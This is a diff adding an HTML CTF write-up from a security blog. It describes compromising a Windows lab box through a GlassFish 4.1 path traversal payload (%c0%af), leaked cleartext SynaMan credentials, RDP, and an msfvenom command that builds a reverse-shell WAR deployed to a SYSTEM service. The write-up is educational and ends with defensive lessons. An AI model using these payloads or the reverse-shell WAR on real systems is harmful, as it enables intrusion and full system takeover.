@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Fish: GlassFish traversal to creds to a SYSTEM WAR · gp_sec</title>
+<meta name="description" content="A standalone Windows box. Read config files through a GlassFish path traversal, find cleartext creds, RDP in, then deploy a WAR to a SYSTEM service.">
+<meta name="color-scheme" content="dark">
+<meta name="theme-color" content="#050506">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16.png">
+<link rel="apple-touch-icon" href="/apple-touch-icon.png">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500&family=IBM+Plex+Sans:wght@400;500;600;700&family=IBM+Plex+Serif:wght@600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../styles.css">
+</head>
+<body>
+<div id="progress" aria-hidden="true"></div>
+
+<header class="topbar">
+  <div class="wrap topbar-inner">
+    <a class="wordmark" href="../index.html">gp_sec</a>
+    <nav class="nav" aria-label="Sections">
+      <a href="../notes.html">Notes</a>
+      <a href="../findings.html">Findings</a>
+      <a href="../ctf.html">CTF</a>
+      <a href="../index.html#contact">Contact</a>
+    </nav>
+  </div>
+</header>
+
+<main class="article">
+  <div class="wrap article-inner">
+    <a class="back" href="../ctf.html">Back to all CTFs</a>
+
+    <p class="dateline">Fish · windows</p>
+    <h1>Fish: a GlassFish traversal that reads its way in, then a WAR to SYSTEM</h1>
+
+    <p>
+      This is a standalone Windows box, no domain, but it's a good one because the
+      whole path is about reading the right files and then abusing a service that
+      runs too high. A path traversal in an old GlassFish server lets me read any
+      file on disk. One of those files leaks a password. That password gets me in
+      over RDP. And because the GlassFish service itself runs as SYSTEM, I hand it
+      a malicious app and it runs my code as SYSTEM. Clean start to finish.
+    </p>
+
+    <h2>What's running</h2>
+    <p>
+      The scan showed a busy Windows host: RDP, a GlassFish 4.1 admin console on
+      4848, a SynaMan file manager on 6060, and a couple of GlassFish web ports.
+      An old GlassFish version is worth checking straight away, and this one was
+      vulnerable.
+    </p>
+
+    <h2>GlassFish path traversal</h2>
+    <p>
+      GlassFish 4.1 has a directory traversal bug in its <code>/theme/META-INF/</code>
+      path. The trick is that it validates against normal <code>../</code>
+      sequences, but you can slip past the check using an overlong UTF-8 encoding of
+      the slash, <code>%c0%af</code>, which the server still decodes as a path
+      separator. No login needed. That means I can read any file on the box:
+    </p>
+    <pre>/theme/META-INF/prototype%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini</pre>
+    <p>
+      That returned <code>win.ini</code>, so the read worked. From there it's a
+      hunt: which files on this box hold something useful?
+    </p>
+
+    <h2>Reading creds out of a config file</h2>
+    <p>
+      The SynaMan file manager was also on the box, and that software is known to
+      store its SMTP password in cleartext in its config. So I used the traversal
+      to read SynaMan's <code>AppConfig.xml</code>:
+    </p>
+    <pre>/theme/META-INF/prototype%c0%af..%c0%af..%c0%af..%c0%afSynaMan/config/AppConfig.xml</pre>
+    <p>
+      And there it was, a username and password sitting in the XML in the clear:
+    </p>
+    <pre>smtpUser:     arthur
+smtpPassword: KingOfAtlantis</pre>
+    <p>
+      A password stored for email, reused for the actual Windows account. That's a
+      common real-world mistake, and it's exactly what made this box solvable.
+    </p>
+
+    <h2>Getting a foothold over RDP</h2>
+    <p>
+      I checked the credentials against SMB and they were valid for the user
+      <code>arthur</code>. WinRM wasn't available, but RDP was open, so I logged in
+      to a full desktop as arthur and grabbed the user flag. Foothold done.
+    </p>
+
+    <h2>The service that runs as SYSTEM</h2>
+    <p>
+      Now for root. I looked at what services were running and how, and the
+      GlassFish service stood out, it runs as LocalSystem (SYSTEM). That's the key
+      fact. GlassFish is an application server: its whole job is to run web apps you
+      deploy to it. If the service runs as SYSTEM, then any app I deploy runs as
+      SYSTEM too.
+    </p>
+    <p>
+      So the plan is simple: build a small malicious web app (a WAR file with a
+      reverse shell), and deploy it through the GlassFish admin console. The admin
+      console still had default credentials (<code>admin:admin</code>), so I was
+      already able to log in.
+    </p>
+    <pre># build a WAR with a reverse shell payload
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;me&gt; LPORT=5555 -f war -o pwn.war</pre>
+    <p>
+      I copied the WAR onto the box (I already had an RDP session as arthur),
+      deployed it through the admin console's Applications page, started a listener,
+      and hit the app's URL to trigger it. The shell came back running as SYSTEM,
+      and the proof flag was in the Administrator's desktop.
+    </p>
+
+    <h2>The chain, in one line</h2>
+    <blockquote>
+      A GlassFish traversal reads a config file, the config leaks a reused password,
+      the password gets RDP access, and because GlassFish runs as SYSTEM, deploying
+      a WAR to it runs my shell as SYSTEM.
+    </blockquote>
+
+    <h2>What I took from it</h2>
+    <p>
+      Two things. First, when you find a file-read bug, the win is usually not the
+      obvious file, it's a config belonging to <em>some other</em> app on the box.
+      Here the GlassFish bug read SynaMan's config, and that's what leaked the
+      password. Look sideways. Second, always check what a service runs as. An app
+      server running as SYSTEM turns "I can deploy an app" into "I can run code as
+      SYSTEM", and that's a straight line from a default admin login to full
+      control. Default creds plus an over-privileged service is a combination you
+      see in real environments, not just labs.
+    </p>
+
+    <p><a class="back" href="../ctf.html">Back to all CTFs</a></p>
+  </div>
+</main>
+
+<footer>
+  <div class="wrap foot-inner">
+    <span class="quote">&ldquo;Find the bug. Understand why it works. Make sure it doesn&rsquo;t come back.&rdquo;</span>
+    <span id="clock">Chennai<span class="sep">·</span><span id="time">--:--:--</span></span>
+  </div>
+</footer>
+<script>
+(function(){
+  var t=document.getElementById('time');
+  if(t){function tick(){t.textContent=new Intl.DateTimeFormat('en-GB',{timeZone:'Asia/Kolkata',hour:'2-digit',minute:'2-digit',second:'2-digit',hour12:false}).format(new Date())+' IST';}tick();setInterval(tick,1000);}
+  if(window.matchMedia('(prefers-reduced-motion:reduce)').matches)return;
+  var bar=document.getElementById('progress'),raf=null;
+  if(!bar)return;
+  function onScroll(){if(raf)return;raf=requestAnimationFrame(function(){var h=document.documentElement,max=h.scrollHeight-h.clientHeight;bar.style.width=(max>0?(h.scrollTop/max)*100:0)+'%';raf=null;});}
+  window.addEventListener('scroll',onScroll,{passive:true});onScroll();
+})();
+</script>
+</body>
+</html>
